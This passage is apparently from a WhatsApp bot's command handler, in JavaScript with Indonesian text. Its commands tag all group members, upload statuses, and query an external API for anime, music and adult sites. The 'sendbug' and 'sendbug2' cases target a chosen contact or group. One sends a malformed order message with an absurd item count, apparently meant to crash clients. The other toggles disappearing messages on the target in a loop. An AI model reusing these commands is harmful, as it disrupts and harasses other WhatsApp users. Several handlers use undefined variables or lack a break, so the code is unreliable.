hexa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
		break

//-- owner bot
case 'owner':
    nomor = `${ownerNumber}@s.whatsapp.net`
    owner = await fs.readFileSync('./stik/thumb.jpeg').toString('base64')
    capt = `Owner ${namabot}\nIG : ${namaig}`
    const been = {
    text: `@${nomor.split("@")[0]} Nih Owner ku, chat aja kalo ada perlu`,
  contextInfo: {
mentionedJid: [nomor]
  }
}
reply(been, text, capt, owner)
break
case 'tagall':
		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `*•* @${mem.jid.split('@')[0]}\n`
		members_id.push(mem.jid)
		}
		mentions('╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - 〙', members_id, true)
		await limitAdd(sender)
		break
case 'tagall2':
		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split('@')[0]}\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - 〙', text, {quoted: ftoko})
		await limitAdd(sender)
		break
		case 'tagall3':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙', text, {detectLinks: false, quoted: ftoko})
		await limitAdd(sender)
		break
		case 'tagall4':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split('@')[0]}@c.us\n`
		members_id.push(mem.jid)
		}
		hexa.sendMessage(from, '╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙', text, {quoted: ftoko})
		await limitAdd(sender)
		break
		case 'tagall5':
		
		

		members_id = []
		teks = (args.length > 1) ? body.slice(8).trim() : ''
		teks += `  Total : ${groupMembers.length}\n`
		for (let mem of groupMembers) {
		teks += `╠➥ ${mem.jid.split('@')[0]}@s.whatsapp.net\n`
		members_id.push(mem.jid)
		}
		reply('╔══✪〘 Mention All 〙✪══\n╠➥'+teks+'╚═〘 - - - - - 〙')
		await limitAdd(sender)
		break
case 'githubstalk':
		
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.avatar)
					hexa.sendMessage(from, buffer, image, {quoted: ftroli, caption: txt})
					break
		case 'tiktokstalk':

			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					hexa.sendMessage(from, buffer, image, {quoted: ftroli, caption: txt})
					break
            case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
                  hexa.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: ftroli})
                  hexa.sendMessage(from, 'Tuh nomer owner ku >_<, jangan spam atau ku block kamu',MessageType.text, { quoted: ftroli} )
case 'stat':
 
 if (!mek.key.fromMe) return reply('SELF-BOT')
 anu = process.uptime()
 menu =`      ❐ *𝙿𝚈𝚃𝙷𝙾𝙽 𝚂𝚃𝙰𝚃* ❐
┏━━━━━━━ ❒
┣➣Prefix : *[ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]*
┣➣WAConection : *[ 𝙱𝙰𝙸𝙻𝙴𝚈𝚂 ]*
┣➣Baileys Version : *[ 3.4.1 ]*
┣➣Run with : *[𝚃𝙴𝚁𝙼𝚄𝚇]*
┣➣Termux version : *[ 0.1.0.1 ]*
┣➣Browser : *[ 𝙵𝙸𝚁𝙴𝙵𝙾𝚇 ]*
┣➣Baterai : *[ ${baterai.baterai}% ]*
┣➣Charge : *[ ${baterai.cas === 'true' ? 'Ya' : 'Tidak'} ]*
┣➣Status : *[ ${banChats} ]*
┣➣Device : *[ ${device_manufacturer} ]*
┣➣Versi OS : *[ ${os_version} ]*
┣➣Versi Device : *[ ${device_model} ]*
┣➣RAM : *[ ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB ]*
┣➣MCC : *[ ${mcc} ]*
┣➣MNC : *[ ${mnc} ]*
┣➣Versi Wa : *[ ${hexa.user.phone.wa_version} ]*
┣➣Runtime :  ${kyun(anu)} 
┗━━━━━━━━ ❑`

hexa.sendMessage(from, menu, text, {quoted:fvideo}) 
break
case 'waktu':
case 'hari' :
 case 'Jam':
  case 'jamberapa':
 waktu = `┏━━━ ❒ *[ 𝚆𝙰𝙺𝚃𝚄 ]*
┣➣Hari : *[ ${tampilHari} ]*
┣➣Jam : *[ ${time} WIB ]*
┣➣Jam : *[ ${wit} WIT ]*
┣➣Jam : *[ ${wita} WITA ]*
┗━━━━━━━━ ❑`

hexa.sendMessage(from, waktu, text, {quoted:fvideo})
break

case 'upswteks':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    hexa.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    hexa.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`crewbot`}, MessageType.location)
                    reply(`Sukses upload lokasi kek status:\n${teks}`)
                    break	
                 case 'upswsticker':
if (!mek.key.fromMe) return fakestatus('Owner Only!!!')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker kek status whatsapp`)
                    break
                     case 'upswaudio':
                      
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio kek status whatsapp`)
						break
						case 'upswvoice':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await hexa.downloadMediaMessage(encmedia)
						hexa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice kek status whatsapp`)
						break
case 'upswvideo':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await hexa.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    hexa.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video kek status whatsapp:\n${konti}`)
                        break
                           case 'upswgif':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')

                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hexa.downloadAndSaveMediaMessage(enmedia)
                    
                    hexa.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif kek status whatsapp:\n${konti}`)
                        break
                        case 'upswimage':
			if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await hexa.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    hexa.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: ftoko, caption: `${teksyy}`})
                    reply(`Sukses upload image kek status whatsapp:\n${teksyy}`)
                       break
                       case 'tes':
const rows = [
 {title: 'Ganteng', description: "", rowId:"Tes"},
 {title: 'Ganteng bat', description: "", rowId:"Tes"},
 {title: 'G', description: "", rowId:"Tes"},
 {title: 'Bacot', description: "", rowId:"Tes"},
 {title: 'Kontol', description: "", rowId:"Tes"},
]

const sections = [{title: "Fino ganteng kan ya", rows: rows}]

const button = {
 buttonText: 'Pilih sati jgn rebutan',
 description: `Fino ganteng kan?`,
 sections: sections,
 listType: 1
}

const sendMsg = await hexa.sendMessage(from, button, MessageType.listMessage)
break 

             
 
case 'sendbug':

if (!q) return reply(`Penggunaan:\n${prefix}sendbug 0@c.us (Untuk Kontak)\n${prefix}sendbug 0@g.us (Untuk Grup)`)
reply(`Sedang Diproses....`)
hexa.sendMessage(q, '𝕷𝖀⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢𝕱𝕴 4000 4001', text, {quoted : { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '999999999999999999999', status: 'INQUIRY', surface:  'CATALOG', message: '*Cuman Trolli*', jpegthumnail: fs.readFileSync('./stik/thumb.jpeg'), orderTitle: 'Cuih', sellerJid: '0@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}})
reply(`Sukses Mengirim Bug`)
break
case 'buggc':
await hexa.toggleDisappearingMessages(from)
reply("⤳𝙓ͯ𝙘ͨ𝙤ͦ𝙙ͩ𝙚ͤ 𝙬ⷠ𝙖ⷠ𝙨ⷠ 𝙝𝙚𝙧𝙚")
break
case 'sendbug2':
if (!q) return reply(`Penggunaan:\n${prefix}sendbug 0@c.us (Untuk Kontak)\n${prefix}sendbug 0@g.us (Untuk Grup)`)
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await hexa.toggleDisappearingMessages(from, q)
}
reply('Sukses Send Bug Sebanyak '+args.join(' '))
					break
			case 'creategrup': 
			 case 'creategroup': 
			  case 'createg':
			   case 'create':
				argz = args.join('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hexa.groupCreate(argz[0], mentioned)
					.then((res) => mek.FtroliForwarded(from, JSON.stringify(res, null, 2).toString(), fake))
					.catch((err) => console.log(err))
				} else {
					mek.reply(from, `Penggunaan ${prefix}creategrup namagrup|@tag`, mek)
				}
				break
                case 'fakedonald':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/tweettrump?apikey=${lolkey}&text=${ini_txt}`)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko })
                    break
                case 'xhamstersearch':


                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xhamster':


                    if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamster?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    ini_txt += `Dislike : ${get_result.dislikes}\n`
                    ini_txt += `Comment : ${get_result.comments}\n`
                    ini_txt += "Link : \n"
                    link = get_result.link
                    for (var x of link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'xnxxsearch':


                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx':


                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'nhentai':


                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
                case 'nhentaipdf':


                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    await hexa.sendMessage(from, ini_buffer, document, { quoted: ftroli, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break
                case 'nhentaisearch':


                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nekopoi':


                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var memek in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'nekopoisearch':


                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    await hexa.sendMessage(from, ini_buffer, sticker, { quoted: ftoko })
                    break

                    case 'attp2':
                 if (args.length == 0) return reply(`Example: ${prefix + command} Fino`)
                 query = args.join(" ")
                 buffer = await getBuffer(`https://api.lolhuman.xyz/api/attp2?apikey=${lolkey}&text=${query}`)
           await hexa.sendMessage(from, buffer, sticker, {quoted:fvideo})
           break
                case 'twtdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_url = ini_url[ini_url.length - 1].link
                    ini_buffer = await getBuffer(ini_url)
                    await hexa.sendMessage(from, ini_buffer, video, { quoted: ftroli })
                    break
       case 'jooxplay':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await hexa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: ftroli })
                    break   
                case 'spotify':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=${lolkey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    await hexa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: ftoko})
                    break
                case 'spotifysearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'character':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break
                case 'manga':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await hexa.sendMessage(from, thumbnail, image, { quoted: ftoko, caption: ini_txt })
                    break

                case 'kusonime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonime?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await hexa.sendMessage(from, ini_buffer, image, { quoted: ftoko, caption: ini_txt })
                    break
                case 'kusonimesearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
